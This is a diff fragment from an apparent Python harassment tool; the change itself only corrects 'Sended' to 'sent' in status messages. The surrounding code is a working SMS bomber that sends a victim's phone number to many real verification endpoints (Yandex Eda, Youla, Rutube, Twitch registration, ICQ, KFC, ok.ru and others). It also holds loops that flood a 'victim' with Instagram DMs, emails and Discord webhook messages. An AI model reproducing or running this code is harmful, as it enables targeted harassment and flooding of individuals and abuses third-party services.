@@ -49,132 +49,132 @@ def smsbomb():
         cn = cn + 1
         try:
             requests.post('https://eda.yandex/api/v1/user/request_authentication_code', json={"phone_number": f'+{fp}'})
-            print(f' {Fore.RED}[{Fore.GREEN}+{Fore.RED}]{Fore.MAGENTA} Sended MSG {Fore.GREEN}{cn}{Fore.MAGENTA} successfull!\n')
+            print(f' {Fore.RED}[{Fore.GREEN}+{Fore.RED}]{Fore.MAGENTA} Sent MSG {Fore.GREEN}{cn}{Fore.MAGENTA} successfull!\n')
 
         except:
-            print(f' {Fore.RED}[-]{Fore.MAGENTA} Sended MSG {Fore.GREEN}{cn}{Fore.MAGENTA} unsuccessfull! :(\n')
+            print(f' {Fore.RED}[-]{Fore.MAGENTA} sent MSG {Fore.GREEN}{cn}{Fore.MAGENTA} unsuccessfull! :(\n')
 
         cn = cn + 1
         try:
             requests.post('https://youla.ru/web-api/auth/request_code', data={'phone': fp})
-            print(f' {Fore.RED}[{Fore.GREEN}+{Fore.RED}]{Fore.MAGENTA} Sended MSG {Fore.GREEN}{cn}{Fore.MAGENTA} successfull!\n')
+            print(f' {Fore.RED}[{Fore.GREEN}+{Fore.RED}]{Fore.MAGENTA} sent MSG {Fore.GREEN}{cn}{Fore.MAGENTA} successfull!\n')
 
         except:
-            print(f' {Fore.RED}[-]{Fore.MAGENTA} Sended MSG {Fore.GREEN}{cn}{Fore.MAGENTA} unsuccessfull! :(\n')
+            print(f' {Fore.RED}[-]{Fore.MAGENTA} sent MSG {Fore.GREEN}{cn}{Fore.MAGENTA} unsuccessfull! :(\n')
 
         cn = cn + 1
         try:
             requests.post(url=f'https://rutube.ru/api/accounts/sendpass/phone?phone=%2B{fp}')
-            print(f' {Fore.RED}[{Fore.GREEN}+{Fore.RED}]{Fore.MAGENTA} Sended MSG {Fore.GREEN}{cn}{Fore.MAGENTA} successfull!\n')
+            print(f' {Fore.RED}[{Fore.GREEN}+{Fore.RED}]{Fore.MAGENTA} sent MSG {Fore.GREEN}{cn}{Fore.MAGENTA} successfull!\n')
 
         except:
-            print(f' {Fore.RED}[-]{Fore.MAGENTA} Sended MSG {Fore.GREEN}{cn}{Fore.MAGENTA} unsuccessfull! :(\n')
+            print(f' {Fore.RED}[-]{Fore.MAGENTA} sent MSG {Fore.GREEN}{cn}{Fore.MAGENTA} unsuccessfull! :(\n')
 
         cn = cn + 1
         try:
             requests.post(url=f'https://www.tvzavr.ru/api/3.1/sms/send_confirm_code?plf=tvz&phone={fp}&csrf_value=1148ec45f24c4090b3ec7882a57831af')
-            print(f' {Fore.RED}[{Fore.GREEN}+{Fore.RED}]{Fore.MAGENTA} Sended MSG {Fore.GREEN}{cn}{Fore.MAGENTA} successfull!\n')
+            print(f' {Fore.RED}[{Fore.GREEN}+{Fore.RED}]{Fore.MAGENTA} sent MSG {Fore.GREEN}{cn}{Fore.MAGENTA} successfull!\n')
 
         except:
-            print(f' {Fore.RED}[-]{Fore.MAGENTA} Sended MSG {Fore.GREEN}{cn}{Fore.MAGENTA} unsuccessfull! :(\n')
+            print(f' {Fore.RED}[-]{Fore.MAGENTA} sent MSG {Fore.GREEN}{cn}{Fore.MAGENTA} unsuccessfull! :(\n')
 
         cn = cn + 1
         try:
             username = f"ThisSABot{random.randint(1023010, 129419930)}"
             password = f"BottiAcc_{random.randint(111, 9999)}@!"
             requests.post('https://passport.twitch.tv/register?trusted_request=true',json={"birthday": {"day": 11, "month": 11, "year": 1999},"client_id": "kd1unb4b3q4t58fwlpcbzcbnm76a8fp", "include_verification_code": True,"password": password, "phone_number": fp, "username": username})
-            print(f' {Fore.RED}[{Fore.GREEN}+{Fore.RED}]{Fore.MAGENTA} Sended MSG {Fore.GREEN}{cn}{Fore.MAGENTA} successfull!\n')
+            print(f' {Fore.RED}[{Fore.GREEN}+{Fore.RED}]{Fore.MAGENTA} sent MSG {Fore.GREEN}{cn}{Fore.MAGENTA} successfull!\n')
 
         except:
-            print(f' {Fore.RED}[-]{Fore.MAGENTA} Sended MSG {Fore.GREEN}{cn}{Fore.MAGENTA} unsuccessfull! :(\n')
+            print(f' {Fore.RED}[-]{Fore.MAGENTA} sent MSG {Fore.GREEN}{cn}{Fore.MAGENTA} unsuccessfull! :(\n')
 
         cn = cn + 1
         try:
             requests.post('https://www.icq.com/smsreg/requestPhoneValidation.php',data={'msisdn': fp, "locale": 'en', 'countryCode': 'ru', 'version': '1',"k": "ic1rtwz1s1Hj1O0r", "r": "46763"})
-            print(f' {Fore.RED}[{Fore.GREEN}+{Fore.RED}]{Fore.MAGENTA} Sended MSG {Fore.GREEN}{cn}{Fore.MAGENTA} successfull!\n')
+            print(f' {Fore.RED}[{Fore.GREEN}+{Fore.RED}]{Fore.MAGENTA} sent MSG {Fore.GREEN}{cn}{Fore.MAGENTA} successfull!\n')
 
         except:
-            print(f' {Fore.RED}[-]{Fore.MAGENTA} Sended MSG {Fore.GREEN}{cn}{Fore.MAGENTA} unsuccessfull! :(\n')
+            print(f' {Fore.RED}[-]{Fore.MAGENTA} sent MSG {Fore.GREEN}{cn}{Fore.MAGENTA} unsuccessfull! :(\n')
 
         cn = cn + 1
         try:
             requests.post('https://cloud.mail.ru/api/v2/notify/applink',json={"phone": "+" + fp, "api": 2, "email": "email", "x-email": "x-email"})
-            print(f' {Fore.RED}[{Fore.GREEN}+{Fore.RED}]{Fore.MAGENTA} Sended MSG {Fore.GREEN}{cn}{Fore.MAGENTA} successfull!{Fore.RESET}\n')
+            print(f' {Fore.RED}[{Fore.GREEN}+{Fore.RED}]{Fore.MAGENTA} sent MSG {Fore.GREEN}{cn}{Fore.MAGENTA} successfull!{Fore.RESET}\n')
 
         except:
-            print(f' {Fore.RED}[-]{Fore.MAGENTA} Sended MSG {Fore.GREEN}{cn}{Fore.MAGENTA} unsuccessfull! :({Fore.RESET}\n')
+            print(f' {Fore.RED}[-]{Fore.MAGENTA} sent MSG {Fore.GREEN}{cn}{Fore.MAGENTA} unsuccessfull! :({Fore.RESET}\n')
             
         cn = cn + 1
         try:
             requests.post("https://qlean.ru/clients-api/v2/sms_codes/auth/request_code",json = {"phone": fn})
-            print(f' {Fore.RED}[{Fore.GREEN}+{Fore.RED}]{Fore.MAGENTA} Sended MSG {Fore.GREEN}{cn}{Fore.MAGENTA} successfull!{Fore.RESET}\n')
+            print(f' {Fore.RED}[{Fore.GREEN}+{Fore.RED}]{Fore.MAGENTA} sent MSG {Fore.GREEN}{cn}{Fore.MAGENTA} successfull!{Fore.RESET}\n')
 
         except:
-            print(f' {Fore.RED}[-]{Fore.MAGENTA} Sended MSG {Fore.GREEN}{cn}{Fore.MAGENTA} unsuccessfull! :({Fore.RESET}\n')
+            print(f' {Fore.RED}[-]{Fore.MAGENTA} sent MSG {Fore.GREEN}{cn}{Fore.MAGENTA} unsuccessfull! :({Fore.RESET}\n')
             
         cn = cn + 1
         try:
             requests.post('https://app-api.kfc.ru/api/v1/common/auth/send-validation-sms', json={'phone': f"+{fn}"}, headers=HEADERS)
-            print(f' {Fore.RED}[{Fore.GREEN}+{Fore.RED}]{Fore.MAGENTA} Sended MSG {Fore.GREEN}{cn}{Fore.MAGENTA} successfull!{Fore.RESET}\n')
+            print(f' {Fore.RED}[{Fore.GREEN}+{Fore.RED}]{Fore.MAGENTA} sent MSG {Fore.GREEN}{cn}{Fore.MAGENTA} successfull!{Fore.RESET}\n')
 
         except:
-            print(f' {Fore.RED}[-]{Fore.MAGENTA} Sended MSG {Fore.GREEN}{cn}{Fore.MAGENTA} unsuccessfull! :({Fore.RESET}\n')
+            print(f' {Fore.RED}[-]{Fore.MAGENTA} sent MSG {Fore.GREEN}{cn}{Fore.MAGENTA} unsuccessfull! :({Fore.RESET}\n')
             
         cn = cn + 1
         try:
             requests.post("https://ok.ru/dk?cmd=AnonymRegistrationEnterPhone&st.cmd=anonymRegistrationEnterPhone", data = {"st.r.phone": f'+{fn}'})
-            print(f' {Fore.RED}[{Fore.GREEN}+{Fore.RED}]{Fore.MAGENTA} Sended MSG {Fore.GREEN}{cn}{Fore.MAGENTA} successfull!{Fore.RESET}\n')
+            print(f' {Fore.RED}[{Fore.GREEN}+{Fore.RED}]{Fore.MAGENTA} sent MSG {Fore.GREEN}{cn}{Fore.MAGENTA} successfull!{Fore.RESET}\n')
 
         except:
-            print(f' {Fore.RED}[-]{Fore.MAGENTA} Sended MSG {Fore.GREEN}{cn}{Fore.MAGENTA} unsuccessfull! :({Fore.RESET}\n')
+            print(f' {Fore.RED}[-]{Fore.MAGENTA} sent MSG {Fore.GREEN}{cn}{Fore.MAGENTA} unsuccessfull! :({Fore.RESET}\n')
             
         cn = cn + 1
         try:
             requests.post('https://youla.ru/web-api/auth/request_code', json = {"phone":f'+{fn}'})
-            print(f' {Fore.RED}[{Fore.GREEN}+{Fore.RED}]{Fore.MAGENTA} Sended MSG {Fore.GREEN}{cn}{Fore.MAGENTA} successfull!{Fore.RESET}\n')
+            print(f' {Fore.RED}[{Fore.GREEN}+{Fore.RED}]{Fore.MAGENTA} sent MSG {Fore.GREEN}{cn}{Fore.MAGENTA} successfull!{Fore.RESET}\n')
 
         except:
-            print(f' {Fore.RED}[-]{Fore.MAGENTA} Sended MSG {Fore.GREEN}{cn}{Fore.MAGENTA} unsuccessfull! :({Fore.RESET}\n')
+            print(f' {Fore.RED}[-]{Fore.MAGENTA} sent MSG {Fore.GREEN}{cn}{Fore.MAGENTA} unsuccessfull! :({Fore.RESET}\n')
             
         cn = cn + 1
         try:
             requests.post('https://eda.yandex/api/v1/user/request_authentication_code',json={"phone_number": f'+{fn}'})
-            print(f' {Fore.RED}[{Fore.GREEN}+{Fore.RED}]{Fore.MAGENTA} Sended MSG {Fore.GREEN}{cn}{Fore.MAGENTA} successfull!{Fore.RESET}\n')
+            print(f' {Fore.RED}[{Fore.GREEN}+{Fore.RED}]{Fore.MAGENTA} sent MSG {Fore.GREEN}{cn}{Fore.MAGENTA} successfull!{Fore.RESET}\n')
 
         except:
-            print(f' {Fore.RED}[-]{Fore.MAGENTA} Sended MSG {Fore.GREEN}{cn}{Fore.MAGENTA} unsuccessfull! :({Fore.RESET}\n')
+            print(f' {Fore.RED}[-]{Fore.MAGENTA} sent MSG {Fore.GREEN}{cn}{Fore.MAGENTA} unsuccessfull! :({Fore.RESET}\n')
             
         cn = cn + 1
         try:
             requests.post("https://api.ivi.ru/mobileapi/user/register/phone/v6", data= {"phone": number_7})
-            print(f' {Fore.RED}[{Fore.GREEN}+{Fore.RED}]{Fore.MAGENTA} Sended MSG {Fore.GREEN}{cn}{Fore.MAGENTA} successfull!{Fore.RESET}\n')
+            print(f' {Fore.RED}[{Fore.GREEN}+{Fore.RED}]{Fore.MAGENTA} sent MSG {Fore.GREEN}{cn}{Fore.MAGENTA} successfull!{Fore.RESET}\n')
 
         except:
-            print(f' {Fore.RED}[-]{Fore.MAGENTA} Sended MSG {Fore.GREEN}{cn}{Fore.MAGENTA} unsuccessfull! :({Fore.RESET}\n')
+            print(f' {Fore.RED}[-]{Fore.MAGENTA} sent MSG {Fore.GREEN}{cn}{Fore.MAGENTA} unsuccessfull! :({Fore.RESET}\n')
             
         cn = cn + 1
         try:
             requests.post("https://api.delitime.ru/api/v2/signup",data={"SignupForm[username]": fn, "SignupForm[device_type]": 3})
-            print(f' {Fore.RED}[{Fore.GREEN}+{Fore.RED}]{Fore.MAGENTA} Sended MSG {Fore.GREEN}{cn}{Fore.MAGENTA} successfull!{Fore.RESET}\n')
+            print(f' {Fore.RED}[{Fore.GREEN}+{Fore.RED}]{Fore.MAGENTA} sent MSG {Fore.GREEN}{cn}{Fore.MAGENTA} successfull!{Fore.RESET}\n')
 
         except:
-            print(f' {Fore.RED}[-]{Fore.MAGENTA} Sended MSG {Fore.GREEN}{cn}{Fore.MAGENTA} unsuccessfull! :({Fore.RESET}\n')
+            print(f' {Fore.RED}[-]{Fore.MAGENTA} sent MSG {Fore.GREEN}{cn}{Fore.MAGENTA} unsuccessfull! :({Fore.RESET}\n')
             
         cn = cn + 1
         try:
             requests.post('https://www.icq.com/smsreg/requestPhoneValidation.php',data={'msisdn': fn, "locale": 'en', 'countryCode': cc,'version': '1', "k": "ic1rtwz1s1Hj1O0r", "r": "46763"})
-            print(f' {Fore.RED}[{Fore.GREEN}+{Fore.RED}]{Fore.MAGENTA} Sended MSG {Fore.GREEN}{cn}{Fore.MAGENTA} successfull!{Fore.RESET}\n')
+            print(f' {Fore.RED}[{Fore.GREEN}+{Fore.RED}]{Fore.MAGENTA} sent MSG {Fore.GREEN}{cn}{Fore.MAGENTA} successfull!{Fore.RESET}\n')
 
         except:
-            print(f' {Fore.RED}[-]{Fore.MAGENTA} Sended MSG {Fore.GREEN}{cn}{Fore.MAGENTA} unsuccessfull! :({Fore.RESET}\n')
+            print(f' {Fore.RED}[-]{Fore.MAGENTA} sent MSG {Fore.GREEN}{cn}{Fore.MAGENTA} unsuccessfull! :({Fore.RESET}\n')
             
         cn = cn + 1
         try:
             requests.post('https://www.icq.com/smsreg/requestPhoneValidation.php',data={'msisdn': ph, "locale": 'en', 'countryCode': cc,'version': '1', "k": "ic1rtwz1s1Hj1O0r", "r": "46763"})
-            print(f' {Fore.RED}[{Fore.GREEN}+{Fore.RED}]{Fore.MAGENTA} Sended MSG {Fore.GREEN}{cn}{Fore.MAGENTA} successfull!{Fore.RESET}\n')
+            print(f' {Fore.RED}[{Fore.GREEN}+{Fore.RED}]{Fore.MAGENTA} sent MSG {Fore.GREEN}{cn}{Fore.MAGENTA} successfull!{Fore.RESET}\n')
 
         except:
-            print(f' {Fore.RED}[-]{Fore.MAGENTA} Sended MSG {Fore.GREEN}{cn}{Fore.MAGENTA} unsuccessfull! :({Fore.RESET}\n')
+            print(f' {Fore.RED}[-]{Fore.MAGENTA} sent MSG {Fore.GREEN}{cn}{Fore.MAGENTA} unsuccessfull! :({Fore.RESET}\n')
 
     clear()
     print(f' {Fore.RED}[{Fore.GREEN}+{Fore.RED}]{Fore.MAGENTA} Finished the SMS bomb! Returning...')
@@ -205,7 +205,7 @@ def igbomb():
     for i in range(amount):
         msgs = msgs + 1
         api.sendMessage(victim_user_id, message)
-        print(f" {Fore.RED}[{Fore.GREEN}+{Fore.RED}]{Fore.MAGENTA} Sended {Fore.GREEN}'{message}'{Fore.MAGENTA} to victim {Fore.CYAN}@{victim} ({victim_user_id}){Fore.MAGENTA}. I sended {Fore.YELLOW}{msgs}{Fore.MAGENTA} in total!{Fore.RESET}\n")
+        print(f" {Fore.RED}[{Fore.GREEN}+{Fore.RED}]{Fore.MAGENTA} sent {Fore.GREEN}'{message}'{Fore.MAGENTA} to victim {Fore.CYAN}@{victim} ({victim_user_id}){Fore.MAGENTA}. I sent {Fore.YELLOW}{msgs}{Fore.MAGENTA} in total!{Fore.RESET}\n")
 
     clear()
     print(f' {Fore.RED}[{Fore.GREEN}+{Fore.RED}]{Fore.MAGENTA} Finished the DM Spamming! Returning...')
@@ -262,7 +262,7 @@ def mailbomb():
     for i in range(amount):
         server.sendmail(mail, victim, msg)
         msgs = msgs + 1
-        print(f" {Fore.RED}[{Fore.GREEN}+{Fore.RED}]{Fore.MAGENTA} Sended {Fore.GREEN}'{body}'{Fore.MAGENTA} to victim {Fore.CYAN}{victim}{Fore.MAGENTA}. I sended {Fore.YELLOW}{msgs}{Fore.MAGENTA} in total!{Fore.RESET}\n")
+        print(f" {Fore.RED}[{Fore.GREEN}+{Fore.RED}]{Fore.MAGENTA} sent {Fore.GREEN}'{body}'{Fore.MAGENTA} to victim {Fore.CYAN}{victim}{Fore.MAGENTA}. I sent {Fore.YELLOW}{msgs}{Fore.MAGENTA} in total!{Fore.RESET}\n")
 
     server.quit()
 
@@ -310,10 +310,10 @@ def webhookspammer():
         msgs = msgs + 1
 
         if nom == 'm' or nom == 'M':
-            print(f" {Fore.RED}[{Fore.GREEN}+{Fore.RED}]{Fore.MAGENTA} Sended {Fore.GREEN}'{message}'{Fore.MAGENTA} to webhook {Fore.CYAN}{webhook_url}{Fore.MAGENTA}. I sended {Fore.YELLOW}{msgs}{Fore.MAGENTA} in total!{Fore.RESET}\n")
+            print(f" {Fore.RED}[{Fore.GREEN}+{Fore.RED}]{Fore.MAGENTA} sent {Fore.GREEN}'{message}'{Fore.MAGENTA} to webhook {Fore.CYAN}{webhook_url}{Fore.MAGENTA}. I sent {Fore.YELLOW}{msgs}{Fore.MAGENTA} in total!{Fore.RESET}\n")
 
         else:
-            print(f" {Fore.RED}[{Fore.GREEN}+{Fore.RED}]{Fore.MAGENTA} Sended {Fore.GREEN}'{embed_description}'{Fore.MAGENTA} to webhook {Fore.CYAN}{webhook_url}{Fore.MAGENTA}. I sended {Fore.YELLOW}{msgs}{Fore.MAGENTA} in total!{Fore.RESET}\n")
+            print(f" {Fore.RED}[{Fore.GREEN}+{Fore.RED}]{Fore.MAGENTA} sent {Fore.GREEN}'{embed_description}'{Fore.MAGENTA} to webhook {Fore.CYAN}{webhook_url}{Fore.MAGENTA}. I sent {Fore.YELLOW}{msgs}{Fore.MAGENTA} in total!{Fore.RESET}\n")
 
     clear()
     print(f' {Fore.RED}[{Fore.GREEN}+{Fore.RED}]{Fore.MAGENTA} Finished the webhook spamming! Returning...')
